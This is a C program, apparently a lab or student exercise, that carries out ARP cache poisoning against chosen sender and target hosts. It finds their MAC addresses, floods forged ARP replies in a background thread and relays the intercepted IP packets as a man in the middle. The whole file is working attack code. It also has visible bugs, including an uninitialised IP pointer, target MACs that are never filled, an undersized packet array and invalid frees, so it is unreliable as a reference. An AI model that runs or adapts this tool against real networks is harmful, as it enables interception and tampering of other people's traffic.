#include <unistd.h>
#include <stdlib.h>
#include <stdint.h>
#include <pcap.h>
#include <stdio.h>
#include <netinet/ip.h>
#include <libnet.h>
#include <net/if.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <net/ethernet.h>
#include <string.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/ioctl.h>
#include <time.h>
#include <pthread.h>

#define IP_ADDR_LEN 4

#pragma pack(push,1)
struct arp_packet{
	struct libnet_ethernet_hdr ETH_hdr;
	struct libnet_arp_hdr ARP_hdr;
	uint8_t src_hrd_addr[ETHER_ADDR_LEN];
	struct in_addr src_pro_addr;
	uint8_t des_hrd_addr[ETHER_ADDR_LEN];
	struct in_addr des_pro_addr;
};
#pragma pack(pop)

struct thread_data{
	pcap_t * _handle;
	int _num;
	unsigned int _time_interval;
	struct arp_packet * _packet[100];
};

int getMacAddress(uint8_t * my_mac, char * interface)
{
	int sock;
        struct ifreq ifr;
        struct sockaddr_in *sin;

        sock = socket(AF_INET, SOCK_STREAM, 0);
	if (sock < 0)
	{
		printf("Error - socket\n");
		return 0;
	}

        strcpy(ifr.ifr_name, interface);
        if (ioctl(sock, SIOCGIFHWADDR, &ifr) < 0)
        {
                printf("Error - get my_mac\n");
		close(sock);
                return 0;
        }
	memcpy(my_mac, ifr.ifr_hwaddr.sa_data, ETHER_ADDR_LEN);
	

	close(sock);
	return 0;
	
}

int getIpAddress(struct in_addr * my_ip, char * interface)
{
	int sock;
        struct ifreq ifr;
        struct sockaddr_in *sin;

        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0)
        {
                printf("Error - socket\n");
                return 0;
        }

        strcpy(ifr.ifr_name, interface);
        if (ioctl(sock, SIOCGIFADDR, &ifr) < 0)
        {
                printf("Error - get my_ip\n");
                close(sock);
                return 0;
        }
	
	sin = (struct sockaddr_in *)&ifr.ifr_addr;
        *my_ip = sin->sin_addr;

        close(sock);
        return 0;

}

void print_mac(uint8_t* mac){
	for(int i=0;i<5;i++){
		printf("%02x:",mac[i]);
	}
	printf("%02x\n",mac[5]);
}

void print_ip(struct in_addr * my_ip){
	printf("Attacker ip : %s\n",inet_ntoa(*my_ip));
}

void make_arp_packet(	struct arp_packet * packet[],int i, uint8_t ether_dhost[], uint8_t ether_shost[], uint16_t ether_type, 
			uint16_t arp_hrd_type, uint16_t arp_pro_type, uint8_t arp_hlen, uint8_t arp_plen, 
			uint16_t arp_opcode, uint8_t src_hrd_addr[ETHER_ADDR_LEN], struct in_addr * src_pro_addr, 
			uint8_t des_hrd_addr[ETHER_ADDR_LEN], struct in_addr * des_pro_addr)
{
	uint16_t tmp = ntohs(ether_type);
	memcpy(packet[i]->ETH_hdr.ether_dhost, ether_dhost, ETHER_ADDR_LEN);     
        memcpy(packet[i]->ETH_hdr.ether_shost, ether_shost, ETHER_ADDR_LEN);
        memcpy(&packet[i]->ETH_hdr.ether_type, &tmp, 2);            

	tmp = ntohs(arp_hrd_type);
        memcpy(&packet[i]->ARP_hdr.ar_hrd, &tmp, 2);
	tmp = ntohs(arp_pro_type);
        memcpy(&packet[i]->ARP_hdr.ar_pro, &tmp, 2);
        memcpy(&packet[i]->ARP_hdr.ar_hln, &arp_hlen, 1);                      
        memcpy(&packet[i]->ARP_hdr.ar_pln, &arp_plen, 1);                      
	tmp = ntohs(arp_opcode);
        memcpy(&packet[i]->ARP_hdr.ar_op, &tmp, 2);

        memcpy(&packet[i]->src_hrd_addr, src_hrd_addr, ETHER_ADDR_LEN);          
        memcpy(&packet[i]->src_pro_addr, src_pro_addr, sizeof(struct in_addr));
        memcpy(packet[i]->des_hrd_addr, des_hrd_addr, ETHER_ADDR_LEN);         
        memcpy(&packet[i]->des_pro_addr, des_pro_addr, sizeof(struct in_addr));
}

void *t_arp_infection(void *th_data)		
{
	pcap_t *handle;
	unsigned int time_interval;
	int num;
	struct arp_packet * packet[2];
	struct thread_data * arg = (struct thread_data *)th_data;
	
	handle = arg->_handle;
	time_interval = arg->_time_interval;
	num = arg ->_num;
	for(int i=0;i<num;i++){
		packet[i] = arg->_packet[i];
	}
	
	while(1)
	{	
		for(int i=0;i<num;i++){
			printf("fake arp packet send\n");
			if(pcap_sendpacket(handle, (unsigned char *)packet[i], sizeof(arp_packet)))    
        		{
                		fprintf(stderr, "\nError sending the packet\n");
	                	exit(0);
        		}
		}
		sleep(time_interval);
	}
}

int main(int argc, char* argv[])
{	
	pcap_t *handle;
	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == NULL) {
    		fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
		return -1;
	}
	
	static int s_num = (argc-2)/2;
	printf("Session num : %d\n",s_num);	

	uint8_t my_mac[ETHER_ADDR_LEN];
	uint8_t sender_mac[s_num][ETHER_ADDR_LEN],target_mac[s_num][ETHER_ADDR_LEN];
	uint8_t BROADCAST_MAC[] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
	uint8_t BROADCAST_MAC2[] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
	struct in_addr * my_ip, *sender_ip[s_num], *target_ip[s_num];
	struct arp_packet * packet[s_num], *fake_packet[s_num];

	uint16_t arp_type = ETHERTYPE_ARP;
	uint16_t arp_hrd_type = ARPHRD_ETHER;
	uint16_t arp_pro_type =ETHERTYPE_IP;
	uint16_t arp_opcode = ARPOP_REQUEST;

	unsigned int time_interval;
	struct thread_data th_data;	
	pthread_t infect_th;
	int thr_id;
	int status;

	printf("Please enter time interval : ");	
	scanf("%d", &time_interval);
	
	//get attacker mac ip
	getMacAddress(my_mac, argv[1]);
	getIpAddress(my_ip, argv[1]);
	
	//print mac and ip
	printf("Attacker mac : ");
	print_mac(my_mac);
	print_ip(my_ip);
	
	//Get sender mac session num times
	for(int i=0;i<s_num;i++){
	        packet[i] = (struct arp_packet *)malloc(sizeof(arp_packet));
	        fake_packet[i] = (struct arp_packet *)malloc(sizeof(arp_packet));
		sender_ip[i] = (struct in_addr *)malloc(sizeof(in_addr));
	        target_ip[i] = (struct in_addr *)malloc(sizeof(in_addr));
		printf("session #%d\n",i);
	
		//set argv[] to sender_ip,target_ip
        	inet_aton(argv[i*2+2], sender_ip[i]);
        	inet_aton(argv[i*2+3], target_ip[i]);
			
		//make request packet
		make_arp_packet(packet,i, BROADCAST_MAC, my_mac, arp_type, arp_hrd_type, arp_pro_type, ETHER_ADDR_LEN, 
		IP_ADDR_LEN, arp_opcode, my_mac, my_ip, BROADCAST_MAC2, sender_ip[i]);
		printf("Make packet #%d\n",i);
		//send arp request packet
		if(pcap_sendpacket(handle, (unsigned char *)packet[i], sizeof(struct arp_packet)))
		{
			fprintf(stderr, "\nError sending the packet\n");
			return -1;
		}
			
		printf("ARP Broadcast start%d\n",i);
		//sleep(1);

		while (true){
			struct pcap_pkthdr* header;
			struct libnet_ethernet_hdr* ETH_header;
			const u_char* rcv_packet;
			u_char * src_hrd_addr;
			struct in_addr* src_pro_addr;
			u_char * des_hrd_addr;
			struct in_addr* des_pro_addr;
			int res = pcap_next_ex(handle, &header, &rcv_packet);
			if (res == 0) continue;
			if (res == -1 || res == -2) break;

			ETH_header = (libnet_ethernet_hdr *)rcv_packet;
			if(ntohs(ETH_header->ether_type) != ETHERTYPE_ARP)continue;

			rcv_packet += sizeof(struct libnet_ethernet_hdr) + sizeof(struct libnet_arp_hdr);
			src_hrd_addr = (u_char *)rcv_packet;
			rcv_packet += ETHER_ADDR_LEN;
			src_pro_addr = (in_addr *)rcv_packet;
			rcv_packet += sizeof(struct in_addr);
			des_hrd_addr = (u_char *)rcv_packet;
         	        rcv_packet += ETHER_ADDR_LEN;
        	        des_pro_addr = (in_addr *)rcv_packet;
			
			//if sender_ip==src_pro_addr
			if(strcmp(inet_ntoa(*sender_ip[i]), inet_ntoa(*src_pro_addr)) == 0){
				//if my_ip==des_pro_addr
				if(strcmp(inet_ntoa(*my_ip), inet_ntoa(*des_pro_addr)) ==0){
					printf("Broadcast done\n");
					memcpy(sender_mac[i], src_hrd_addr, ETHER_ADDR_LEN);
					printf("Sender mac session #%d : ",i);
					print_mac(sender_mac[i]);
					break;
				}
			}
		}	
	}

	//ARP reply
	arp_opcode = ARPOP_REPLY;
	for(int i=0;i<s_num;i++){
		make_arp_packet(fake_packet,i, sender_mac[i], my_mac, arp_type, arp_hrd_type, arp_pro_type, ETHER_ADDR_LEN, 
				IP_ADDR_LEN, arp_opcode, my_mac, target_ip[i], sender_mac[i], sender_ip[i]);
	}

	//set thread_data
	th_data._handle = handle;
	th_data._time_interval = time_interval;
	for (int i=0; i<s_num;i++){
		th_data._packet[i]=fake_packet[i];
	}
	th_data._num = s_num;
	
	thr_id = pthread_create(&infect_th, NULL, t_arp_infection, (void *)&th_data);	// infection thread
        if (thr_id < 0)
        {
                perror("thread create error : ");
                exit(0);
        }
	pthread_detach(infect_th);
	
	//ARP non periodic infection & IP relay
	
	while (true){
                struct pcap_pkthdr* header;
		struct libnet_ethernet_hdr* ETH_header;
		struct libnet_ipv4_hdr* IP_header;
		const u_char* rcv_packet;
                struct in_addr* src_pro_addr;
                int ret = pcap_next_ex(handle, &header, &rcv_packet);
                if (ret == 0) continue;
                if (ret == -1 || ret == -2) break;	
                ETH_header = (libnet_ethernet_hdr *)rcv_packet;
		
		//If ARP packet received
		if(ntohs(ETH_header->ether_type) == ETHERTYPE_ARP){
			//send all infection ARP packet
			
			for(int i=0;i<s_num;i++){
                      		if(pcap_sendpacket(handle, (unsigned char *)fake_packet[i], sizeof(arp_packet)))
        			{
                			fprintf(stderr, "\nError sending the packet\n");
		                	exit(0);
		        	}
			}
			continue;
		}
		
		//If IP packet received
		else if (ntohs(ETH_header->ether_type) == ETHERTYPE_IP){
			rcv_packet += sizeof(struct libnet_ethernet_hdr);
			IP_header = (libnet_ipv4_hdr *)rcv_packet;
			for(int i=0;i<s_num;i++){
					//if shost is sender_mac[i]
				if(	ETH_header->ether_shost[0]==sender_mac[i][0] && ETH_header->ether_shost[1]==sender_mac[i][1] && 
					ETH_header->ether_shost[2]==sender_mac[i][2] && ETH_header->ether_shost[3]==sender_mac[i][3] && 
					ETH_header->ether_shost[4]==sender_mac[i][4] && ETH_header->ether_shost[5]==sender_mac[i][5] && 	
					//if dhost is my_mac
					ETH_header->ether_dhost[0]==my_mac[0] && ETH_header->ether_dhost[1]==my_mac[1] &&
					ETH_header->ether_dhost[2]==my_mac[2] && ETH_header->ether_dhost[3]==my_mac[3] &&
					ETH_header->ether_dhost[4]==my_mac[4] && ETH_header->ether_dhost[5]==my_mac[5] )		
				{
					//change dhost to target_mac[i]
					memcpy(ETH_header->ether_dhost, target_mac[i], ETHER_ADDR_LEN);
					//change shost to my_mac
					memcpy(ETH_header->ether_shost, my_mac, ETHER_ADDR_LEN);
					rcv_packet -= sizeof(struct libnet_ethernet_hdr);
					if(pcap_sendpacket(handle, (unsigned char *)rcv_packet, header->caplen))
	                        	{
        	                        	fprintf(stderr, "\nError sending the packet\n");
                	                	exit(0);
                        		}
	                       		printf("Session#%d Send Relay packet from sender to target\n", i);
				}
			}
		}
        }

	free(packet);
	free(sender_ip);
	free(target_ip);
	return 0;
}
